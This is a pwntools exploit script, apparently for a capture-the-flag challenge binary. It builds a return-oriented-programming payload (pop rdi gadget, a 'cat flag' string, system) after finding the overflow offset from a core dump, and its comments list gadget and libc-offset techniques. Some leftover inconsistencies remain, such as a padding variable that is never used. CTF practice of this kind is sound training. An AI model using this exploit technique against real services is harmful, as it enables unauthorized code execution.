import os
import sys
from pwn import *

#file <filename>
#checksec --file <filename>
#cyclic <length>
#overflow buffer with copied string from cyclic
#for x64 overflow occured previous instruction
#capture 4 elements
#cyclic -l <elememts> to get the offset
#search -t string "/bin/sh"
#ropper -f <filename> --search <string> for pop rdi
#readelf -s ./plibc.so.6 | grep "system"
#strings -a -t x ./plibc.so.6 | grep "bin/sh"
#ldd ./vuln - base address of libc
#mkdir -p /home/hsass/core && sudo bash -c 'echo /home/hsass/core/core_dump > /proc/sys/kernel/core_pattern'
#In gdb to get base address of libc use = piebase -> 0x400000

"""     with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    #os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null") """

# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)



def find_ip(payload):
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    #os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    #ip_offset = cyclic_find(p.corefile.pc)  # x86
    #echo ~/core/core_dump > /proc/sys/kernel/core_pattern
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.fault_addr, n=4))  # x64
    ip_offset = cyclic_find(p.corefile.fault_addr, n=4)  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
# test code
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=True)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(300))
#print(offset)

io = start()

# Lib-c offsets, found manually (ASLR_OFF)
#libc_base = 0x7ffff7dde000
#system = libc_base + 0x48e50
#binsh = libc_base + 0x18a152

# POP RDI gadget (found with ropper)
pop_rdi = 0x400833
cat_flag = 0x400e3d


# How many bytes to the instruction pointer (RIP)?
padding = 0

payload = flat( # Padding up to RIP
    pop_rdi,  # Pop the following address into the RDI register
    cat_flag,  # Address of /bin/sh in libc
    elf.symbols.system,  # Address of system function in libc
)


log.info("Sending payload:\n{}".format(hexdump(payload)))

# Write payload to file
write('payload', payload)

# Exploit
io.sendlineafter('?', payload)
io.recvline(3)


# Get flag/shell

flag = io.recv()
success(flag)

#io.interactive()